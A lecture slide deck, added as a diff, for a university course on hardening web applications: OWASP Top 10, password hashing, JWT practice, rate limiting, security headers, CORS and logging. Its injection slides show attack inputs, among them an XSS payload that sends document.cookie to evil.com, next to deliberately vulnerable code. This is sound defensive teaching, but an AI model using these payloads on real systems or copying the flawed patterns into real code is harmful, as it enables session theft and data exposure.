@@ -1,0 +1,812 @@
+---
+title: "Hardening Web Applications"
+subtitle: "Security, Performance, and Production Readiness"
+author: "Jason Kuruzovich"
+date: "April 24, 2026"
+format:
+  revealjs:
+    navigation-mode: linear
+    mermaid:
+        theme: default
+    theme: [default, ../../slides-theme.scss]
+    logo: ../../static/logos/RPI_Logo_Binary_1_White.png
+    footer: "ITWS-4500 | Week 14"
+    slide-number: true
+    transition: slide
+    width: 1600
+    height: 900
+    code-line-numbers: true
+    highlight-style: github
+    pdf-separate-fragments: false
+---
+
+# Hardening Web Applications {.section-slide background-color="#d6001c"}
+
+From "it works" to "it's ready for production"
+
+# Today's Agenda
+
+::: {.learning-objectives}
+1. What "production hardening" means and why it matters
+2. OWASP Top 10 — the threats you *will* face
+3. Authentication & session hardening
+4. Input validation & injection prevention
+5. HTTP security headers
+6. Infrastructure hardening (HTTPS, CORS, env vars)
+7. Performance & reliability
+8. Monitoring & observability
+9. Hardening checklist for your capstone
+:::
+
+---
+
+# Part 1: What Is Hardening? {.section-slide background-color="#d6001c"}
+
+---
+
+## The Gap Between "Works" and "Production"
+
+| Development | Production |
+|------------|-----------|
+| `localhost`, no HTTPS | Public internet, TLS required |
+| Secrets in `.env` files | Secrets in vault / env management |
+| Errors shown in browser | Errors logged, generic message to user |
+| Single user (you) | Thousands of concurrent users |
+| No attackers | Bots scanning within minutes of deploy |
+| "It works on my machine" | Must work everywhere, all the time |
+
+::: {.callout-important}
+**Rule of thumb:** If your app is on the public internet, it *will* be scanned for vulnerabilities within hours.
+:::
+
+---
+
+## Hardening = Defense in Depth
+
+```{mermaid}
+flowchart LR
+    A[Network Layer<br/>HTTPS, Firewall, CDN] --> B[Transport Layer<br/>TLS, CORS, Headers]
+    B --> C[Application Layer<br/>Auth, Validation, CSRF]
+    C --> D[Data Layer<br/>Encryption, Hashing, Backups]
+    style A fill:#e8f5e9
+    style B fill:#e3f2fd
+    style C fill:#fff3e0
+    style D fill:#fce4ec
+```
+
+No single layer is sufficient. Each layer catches what the others miss.
+
+---
+
+# Part 2: OWASP Top 10 {.section-slide background-color="#d6001c"}
+
+The most critical web application security risks
+
+---
+
+## OWASP Top 10 (2021)
+
+::: {.columns}
+::: {.column width="50%"}
+1. **Broken Access Control** -- #1 risk
+2. **Cryptographic Failures** -- weak hashing, no TLS
+3. **Injection** -- SQL, NoSQL, XSS, command
+4. **Insecure Design** -- flawed architecture
+5. **Security Misconfiguration** -- defaults, open ports
+:::
+
+::: {.column width="50%"}
+6. **Vulnerable Components** -- outdated deps
+7. **Auth Failures** -- weak passwords, no MFA
+8. **Software/Data Integrity** -- untrusted updates
+9. **Logging Failures** -- can't detect breaches
+10. **SSRF** -- server makes unintended requests
+:::
+:::
+
+::: {.callout-tip}
+Your capstone project likely touches #1, #2, #3, #5, #6, #7, and #9.
+:::
+
+---
+
+## #1: Broken Access Control
+
+The most common vulnerability. You've seen this in Lab 6:
+
+```javascript
+// BAD: Returns ALL projects (any user's data)
+app.get('/api/projects', authenticateToken, async (req, res) => {
+  const projects = await Project.find();  // No filter!
+  res.json(projects);
+});
+
+// GOOD: Filter by authenticated user
+app.get('/api/projects', authenticateToken, async (req, res) => {
+  const projects = await Project.find({ userId: req.user.userId });
+  res.json(projects);
+});
+```
+
+**Checklist:**
+
+- Every query filters by `userId` or checks ownership
+- Admin-only routes verify role, not just authentication
+- Direct object references (e.g., `/api/projects/123`) check ownership
+
+---
+
+## #3: Injection Attacks
+
+### SQL Injection
+
+```javascript
+// BAD: String concatenation
+const query = `SELECT * FROM users WHERE name = '${req.body.name}'`;
+// Input: ' OR '1'='1  → returns all users
+
+// GOOD: Parameterized query
+const query = 'SELECT * FROM users WHERE name = $1';
+db.query(query, [req.body.name]);
+```
+
+### NoSQL Injection (MongoDB)
+
+```javascript
+// BAD: Passing raw body to query
+const user = await User.findOne(req.body);
+// Input: {"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+// GOOD: Extract and validate specific fields
+const user = await User.findOne({
+  username: String(req.body.username)
+});
+```
+
+---
+
+## #3: Cross-Site Scripting (XSS)
+
+```javascript
+// BAD: Rendering user input as HTML
+element.innerHTML = userComment;
+// Input: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
+
+// React is safe by default — JSX escapes values
+return <p>{userComment}</p>;  // Renders as text, not HTML
+
+// DANGER: React's escape hatch
+return <div dangerouslySetInnerHTML={{__html: userComment}} />;  // XSS!
+```
+
+**Key defenses:**
+
+- Use frameworks that auto-escape (React, Angular, Vue)
+- Never use `dangerouslySetInnerHTML` with user data
+- Use Content Security Policy (CSP) headers
+- Store JWTs in `httpOnly` cookies (not `localStorage`) when possible
+
+---
+
+# Part 3: Authentication Hardening {.section-slide background-color="#d6001c"}
+
+---
+
+## Password Storage
+
+What you learned in Lab 6, reinforced:
+
+| Approach | Security |
+|----------|----------|
+| Plaintext | Catastrophic -- one breach exposes all passwords |
+| MD5 / SHA-256 | Bad -- fast hashes are brute-forceable (billions/sec on GPU) |
+| bcrypt (cost 10) | Good -- intentionally slow (~100ms per hash) |
+| Argon2id | Best -- memory-hard, resists GPU/ASIC attacks |
+
+```javascript
+// bcrypt — what we used in Lab 6
+const hash = await bcrypt.hash(password, 12);  // cost factor 12
+
+// Argon2 — the current recommendation
+const hash = await argon2.hash(password, {
+  type: argon2.argon2id,
+  memoryCost: 65536,  // 64 MB — memory hardness
+  timeCost: 3,
+  parallelism: 4
+});
+```
+
+---
+
+## JWT Hardening
+
+Beyond what Lab 6 covered:
+
+| Practice | Why |
+|----------|-----|
+| Short access token TTL (15 min) | Limits damage window if stolen |
+| Rotate refresh tokens on use | Detect token reuse (theft indicator) |
+| Store `JWT_SECRET` in env vars | Never hardcode secrets in source |
+| Use RS256 (asymmetric) in production | Public key can verify without exposing signing key |
+| Validate `iss`, `aud`, `exp` claims | Prevent token from other apps being accepted |
+| Revocation list for refresh tokens | Enable true logout |
+
+::: {.callout-warning}
+**Never** put sensitive data (passwords, SSNs) in JWT payloads. They are signed, not encrypted — anyone can decode them at [jwt.io](https://jwt.io).
+:::
+
+---
+
+## Rate Limiting & Brute Force Protection
+
+```javascript
+const rateLimit = require('express-rate-limit');
+
+// General API rate limit
+const apiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,  // 15 minutes
+  max: 100,                   // 100 requests per window
+  message: { error: 'Too many requests, try again later' }
+});
+
+// Stricter limit on auth endpoints
+const authLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,                     // 5 login attempts per 15 min
+  message: { error: 'Too many login attempts' }
+});
+
+app.use('/api/', apiLimiter);
+app.use('/api/login', authLimiter);
+app.use('/api/register', authLimiter);
+```
+
+---
+
+## Rate Limiting Algorithms
+
+| Algorithm | How It Works | Pros | Cons |
+|-----------|-------------|------|------|
+| **Fixed Window** | Count requests in fixed time slots (e.g., 0:00–0:15) | Simple to implement | Burst at window boundary (2x allowed) |
+| **Sliding Window** | Rolling window based on each request's timestamp | Smooth enforcement | More memory (per-request timestamps) |
+| **Token Bucket** | Bucket refills at steady rate; each request takes a token | Allows short bursts, smooth average | Slightly complex |
+| **Leaky Bucket** | Requests queue and drain at fixed rate | Very smooth output rate | Queuing adds latency |
+
+`express-rate-limit` uses **fixed window** by default. For distributed systems, use a **Redis-backed store** so limits are shared across instances.
+
+---
+
+## Rate Limiting: Headers & Client Behavior
+
+Standard response headers communicate limits to clients:
+
+```
+HTTP/1.1 200 OK
+X-RateLimit-Limit: 100          # Max requests per window
+X-RateLimit-Remaining: 47       # Requests left in current window
+X-RateLimit-Reset: 1714070400   # Unix timestamp when window resets
+
+HTTP/1.1 429 Too Many Requests  # When limit is exceeded
+Retry-After: 120                # Seconds until client should retry
+```
+
+**Client best practices:**
+
+- Read `Retry-After` header and wait before retrying
+- Use **exponential backoff**: 1s → 2s → 4s → 8s (not tight loops)
+- Cache responses to reduce request count
+
+---
+
+## Rate Limiting in Production
+
+```javascript
+const RedisStore = require('rate-limit-redis');
+const { createClient } = require('redis');
+
+const redisClient = createClient({ url: process.env.REDIS_URL });
+
+// Distributed rate limiter — shared across all app instances
+const apiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 100,
+  standardHeaders: true,    // Send X-RateLimit-* headers
+  legacyHeaders: false,
+  store: new RedisStore({
+    sendCommand: (...args) => redisClient.sendCommand(args),
+  }),
+});
+```
+
+**Why Redis?** In-memory rate limits reset when a process restarts and aren't shared across instances. Redis gives you a single counter across your entire fleet.
+
+::: {.callout-tip}
+**API Gateway rate limiting:** AWS API Gateway, CloudFront, and Vercel all offer platform-level rate limiting — consider layering these with application-level limits.
+:::
+
+---
+
+# Part 4: HTTP Security Headers {.section-slide background-color="#d6001c"}
+
+---
+
+## Essential Security Headers
+
+Use the `helmet` middleware — one line adds all critical headers:
+
+```javascript
+const helmet = require('helmet');
+app.use(helmet());
+```
+
+What `helmet()` sets:
+
+| Header | Purpose |
+|--------|---------|
+| `Content-Security-Policy` | Restricts where scripts/styles/images can load from |
+| `X-Content-Type-Options: nosniff` | Prevents MIME-type sniffing |
+| `X-Frame-Options: DENY` | Prevents clickjacking via iframes |
+| `Strict-Transport-Security` | Forces HTTPS for future requests |
+| `X-XSS-Protection` | Legacy XSS filter (defense in depth) |
+| `Referrer-Policy` | Controls referrer info sent to other sites |
+
+::: {.callout-tip}
+Test your headers at [securityheaders.com](https://securityheaders.com) — aim for an A grade.
+:::
+
+---
+
+## Content Security Policy (CSP) Deep Dive
+
+CSP is the most powerful header — it whitelists allowed sources:
+
+```javascript
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],           // Only load from same origin
+    scriptSrc: ["'self'"],            // No inline scripts, no CDN scripts
+    styleSrc: ["'self'", "'unsafe-inline'"],  // Allow inline styles (for frameworks)
+    imgSrc: ["'self'", "data:", "https:"],    // Allow images from HTTPS
+    connectSrc: ["'self'", "https://api.example.com"],  // API whitelist
+    fontSrc: ["'self'", "https://fonts.gstatic.com"],
+    objectSrc: ["'none'"],            // No Flash/Java
+    upgradeInsecureRequests: [],      // Auto-upgrade HTTP to HTTPS
+  }
+}));
+```
+
+If an XSS payload tries to load a script from `evil.com`, CSP blocks it.
+
+---
+
+# Part 5: Infrastructure Hardening {.section-slide background-color="#d6001c"}
+
+---
+
+## HTTPS Everywhere
+
+```{mermaid}
+sequenceDiagram
+    participant Client
+    participant CDN/LB as CDN / Load Balancer
+    participant App as App Server
+
+    Client->>CDN/LB: HTTPS (TLS 1.3)
+    Note over CDN/LB: TLS termination
+    CDN/LB->>App: HTTP (internal network)
+    App->>CDN/LB: Response
+    CDN/LB->>Client: HTTPS Response
+```
+
+- **Vercel / CloudFront:** Automatic HTTPS, no config needed
+- **Self-hosted:** Use Let's Encrypt (free) + Nginx/Caddy as reverse proxy
+- **HSTS header:** Tells browsers to *always* use HTTPS for your domain
+
+---
+
+## Environment Variables & Secrets
+
+```bash
+# .env — NEVER commit this file
+JWT_SECRET=a-very-long-random-string-at-least-256-bits
+REFRESH_SECRET=another-long-random-string
+MONGODB_URI=mongodb+srv://user:pass@cluster.mongodb.net/mydb
+GROQ_API_KEY=gsk_xxxxxxxxxxxx
+```
+
+```javascript
+// .gitignore — ALWAYS include
+.env
+.env.local
+.env.production
+```
+
+| Environment | How to manage secrets |
+|-------------|----------------------|
+| Local dev | `.env` file (gitignored) |
+| Vercel | Dashboard > Settings > Environment Variables |
+| AWS Lambda | Parameter Store / Secrets Manager |
+| Docker | `docker-compose.yml` env_file or Docker secrets |
+
+::: {.callout-warning}
+**Audit now:** `git log --all -p -- '*.env'` — if secrets were ever committed, rotate them immediately.
+:::
+
+---
+
+## CORS Configuration
+
+```javascript
+const cors = require('cors');
+
+// BAD: Allow everything
+app.use(cors());  // Access-Control-Allow-Origin: *
+
+// GOOD: Whitelist specific origins
+app.use(cors({
+  origin: ['https://myapp.vercel.app', 'http://localhost:3000'],
+  credentials: true,     // Allow cookies / auth headers
+  methods: ['GET', 'POST', 'PUT', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization']
+}));
+```
+
+- In production, **never** use `origin: '*'` with `credentials: true`
+- List exact origins; don't use regex that can be bypassed
+
+---
+
+# Part 6: Input Validation {.section-slide background-color="#d6001c"}
+
+---
+
+## Validate at Every Boundary
+
+```{mermaid}
+flowchart LR
+    A[User Input] --> B[Client Validation<br/>UX feedback]
+    B --> C[API Validation<br/>Security gate]
+    C --> D[Database Constraints<br/>Last defense]
+    style B fill:#fff3e0
+    style C fill:#e8f5e9
+    style D fill:#e3f2fd
+```
+
+- **Client-side:** For UX only — never trust it for security
+- **Server-side:** The real security gate — validate type, length, format, range
+- **Database:** Schema constraints as the final safety net
+
+---
+
+## Server-Side Validation with Express
+
+```javascript
+const { body, validationResult } = require('express-validator');
+
+app.post('/api/register',
+  body('username')
+    .isString()
+    .trim()
+    .isLength({ min: 3, max: 50 })
+    .matches(/^[a-zA-Z0-9_]+$/),   // alphanumeric + underscore only
+  body('password')
+    .isLength({ min: 8 })
+    .matches(/[A-Z]/)               // at least one uppercase
+    .matches(/[0-9]/),              // at least one digit
+  body('email')
+    .isEmail()
+    .normalizeEmail(),
+  async (req, res) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) {
+      return res.status(400).json({ errors: errors.array() });
+    }
+    // ... proceed with validated data
+  }
+);
+```
+
+---
+
+# Part 7: Dependency Security {.section-slide background-color="#d6001c"}
+
+---
+
+## Your Dependencies Are Your Attack Surface
+
+A typical Node.js app has **hundreds** of transitive dependencies.
+
+```bash
+# Check for known vulnerabilities
+npm audit
+
+# Fix automatically where possible
+npm audit fix
+
+# See what's outdated
+npm outdated
+```
+
+**Automated tools:**
+
+| Tool | What it does |
+|------|-------------|
+| `npm audit` | Built-in vulnerability scanner |
+| Dependabot (GitHub) | Auto-creates PRs for vulnerable deps |
+| Snyk | Deep scanning + container images |
+| Socket.dev | Detects supply-chain attacks in new packages |
+
+::: {.callout-important}
+**Rule:** Run `npm audit` before every deploy. Zero critical/high vulnerabilities in production.
+:::
+
+---
+
+## Lock Files Matter
+
+```
+package-lock.json  (npm)
+yarn.lock          (yarn)
+pnpm-lock.yaml     (pnpm)
+```
+
+- **Always commit your lock file** — it pins exact dependency versions
+- Without it, `npm install` on the server may pull different (possibly vulnerable) versions
+- `npm ci` (not `npm install`) in CI/CD — installs exactly what the lock file specifies
+
+---
+
+# Part 8: Performance & Reliability {.section-slide background-color="#d6001c"}
+
+---
+
+## Performance Checklist
+
+| Area | Action |
+|------|--------|
+| **Static assets** | Serve via CDN (CloudFront, Vercel Edge) |
+| **Images** | Use Next.js `<Image>`, WebP format, lazy loading |
+| **API responses** | Cache with Redis (cache-aside, TTL) |
+| **Database** | Add indexes on frequently queried fields |
+| **Bundle size** | Code splitting, tree shaking, dynamic imports |
+| **Compression** | Enable gzip/brotli (`compression` middleware) |
+| **Connection pooling** | Reuse DB connections (critical for Lambda) |
+
+```javascript
+// Compression middleware — reduces response size 60-80%
+const compression = require('compression');
+app.use(compression());
+```
+
+---
+
+## Error Handling in Production
+
+```javascript
+// Development: show full error
+// Production: generic message + log details
+
+app.use((err, req, res, next) => {
+  // Always log the real error (for you)
+  console.error(err.stack);
+
+  // Never expose internals to the client
+  if (process.env.NODE_ENV === 'production') {
+    res.status(500).json({ error: 'Something went wrong' });
+  } else {
+    res.status(500).json({ error: err.message, stack: err.stack });
+  }
+});
+```
+
+**Why:** Stack traces reveal file paths, framework versions, and internal logic — information that helps attackers.
+
+---
+
+## Graceful Degradation
+
+```javascript
+// Circuit breaker pattern for external services
+async function fetchWithFallback(url, fallback) {
+  try {
+    const response = await fetch(url, {
+      signal: AbortSignal.timeout(5000)  // 5s timeout
+    });
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    return await response.json();
+  } catch (error) {
+    console.error(`Service unavailable: ${url}`, error.message);
+    return fallback;  // Return cached/default data
+  }
+}
+```
+
+- Set **timeouts** on all external calls (DB, APIs, Redis)
+- Have **fallback** behavior when dependencies are down
+- Use **health check** endpoints (`/api/health`) for monitoring
+
+---
+
+# Part 9: Monitoring & Observability {.section-slide background-color="#d6001c"}
+
+---
+
+## The Three Pillars
+
+::: {.columns}
+::: {.column width="33%"}
+### Logs
+*What happened?*
+
+- Structured JSON logging
+- Request ID correlation
+- Don't log sensitive data (passwords, tokens, PII)
+- Centralize (CloudWatch, ELK, Datadog)
+:::
+
+::: {.column width="33%"}
+### Metrics
+*How is it performing?*
+
+- Request rate & error rate
+- Response time (p50, p95, p99)
+- CPU / memory usage
+- Cache hit ratio
+:::
+
+::: {.column width="33%"}
+### Traces
+*Where is time spent?*
+
+- End-to-end request flow
+- Per-service latency breakdown
+- Identify bottlenecks
+- Critical for microservices
+:::
+:::
+
+---
+
+## Structured Logging
+
+```javascript
+// BAD: Unstructured string logs
+console.log('User login failed for ' + username);
+
+// GOOD: Structured JSON logs
+const logger = require('pino')();
+
+logger.info({
+  event: 'login_attempt',
+  username: username,
+  success: false,
+  ip: req.ip,
+  userAgent: req.get('user-agent')
+});
+// Output: {"level":30,"event":"login_attempt","username":"alice",...}
+```
+
+**Why structured?**
+
+- Searchable: `event:login_attempt AND success:false`
+- Parseable by log aggregation tools
+- Consistent format across all services
+
+---
+
+## What NOT to Log
+
+```javascript
+// NEVER log these:
+logger.info({ password: req.body.password });        // Passwords
+logger.info({ token: req.headers.authorization });    // Auth tokens
+logger.info({ ssn: user.socialSecurityNumber });      // PII
+logger.info({ creditCard: payment.cardNumber });      // Financial data
+
+// DO log these:
+logger.info({ userId: user.id, action: 'login' });   // User actions
+logger.info({ statusCode: 401, path: req.path });     // Security events
+logger.info({ responseTime: 250, method: 'GET' });    // Performance
+```
+
+::: {.callout-warning}
+OWASP #9: **Logging & Monitoring Failures** — if you can't detect a breach, you can't respond to it.
+:::
+
+---
+
+# Part 10: Your Hardening Checklist {.section-slide background-color="#d6001c"}
+
+For your capstone project
+
+---
+
+## Pre-Deployment Checklist
+
+::: {.columns}
+::: {.column width="50%"}
+### Security
+
+- [ ] All secrets in environment variables (not code)
+- [ ] `.env` in `.gitignore`
+- [ ] Passwords hashed with bcrypt/Argon2
+- [ ] JWT tokens have short TTL
+- [ ] Every API route checks ownership (`userId` filter)
+- [ ] Input validated server-side
+- [ ] `helmet()` middleware enabled
+- [ ] CORS configured with specific origins
+- [ ] `npm audit` shows zero critical vulnerabilities
+- [ ] HTTPS enabled (automatic on Vercel/CloudFront)
+:::
+
+::: {.column width="50%"}
+### Reliability
+
+- [ ] Error handler returns generic messages in prod
+- [ ] Timeouts on all external calls
+- [ ] Health check endpoint (`/api/health`)
+- [ ] Database connection pooling / caching
+- [ ] Lock file committed
+- [ ] `npm ci` used in CI/CD (not `npm install`)
+- [ ] Compression middleware enabled
+- [ ] Static assets served via CDN
+- [ ] Structured logging (no sensitive data)
+- [ ] README with setup and deploy instructions
+:::
+:::
+
+---
+
+## Security Scanning Tools
+
+Run these against your deployed app:
+
+| Tool | What it checks | URL |
+|------|---------------|-----|
+| **SecurityHeaders.com** | HTTP security headers | [securityheaders.com](https://securityheaders.com) |
+| **SSL Labs** | TLS configuration | [ssllabs.com/ssltest](https://www.ssllabs.com/ssltest/) |
+| **npm audit** | Dependency vulnerabilities | CLI: `npm audit` |
+| **Lighthouse** | Performance, accessibility, SEO | Chrome DevTools > Lighthouse |
+| **OWASP ZAP** | Automated vulnerability scanning | [zaproxy.org](https://www.zaproxy.org/) |
+
+---
+
+## Architecture Review Questions
+
+Before your final presentation, ask yourselves:
+
+1. **If our database is breached**, are passwords safe? (hashed with bcrypt/Argon2?)
+2. **If a JWT is stolen**, what's the blast radius? (short TTL? ownership checks?)
+3. **If a dependency has a CVE**, how fast can we update? (lock file? CI/CD?)
+4. **If our API gets 10x traffic**, what breaks first? (caching? DB indexes? connection pool?)
+5. **If our app throws an error**, does the user see a stack trace? (error handler?)
+6. **If we need to audit user actions**, can we search logs? (structured logging?)
+
+---
+
+# Summary {.section-slide background-color="#d6001c"}
+
+---
+
+## Key Takeaways
+
+1. **Hardening is defense in depth** — network, transport, application, and data layers
+2. **OWASP Top 10** maps directly to what you've built — broken access control and injection are #1 and #3
+3. **Authentication hardening** goes beyond "it works" — rate limiting, token rotation, proper hashing
+4. **Security headers** (`helmet`) are one line of code for massive protection
+5. **Never trust client input** — validate server-side, use parameterized queries
+6. **Dependencies are attack surface** — audit, lock, update
+7. **Errors in production must be generic** — log details, show nothing
+8. **If you can't see it, you can't fix it** — structured logging and monitoring
+
+---
+
+## Next Steps
+
+- **Today:** Apply the hardening checklist to your capstone project
+- **April 28:** Final presentations — be ready to discuss your hardening decisions
+- **Deliverables:** Working deployed app, technical documentation, architecture decision records
+
+::: {.callout-tip}
+**Final tip:** Security is not a feature you add at the end. But if you haven't added it yet, *today* is the best day to start.
+:::
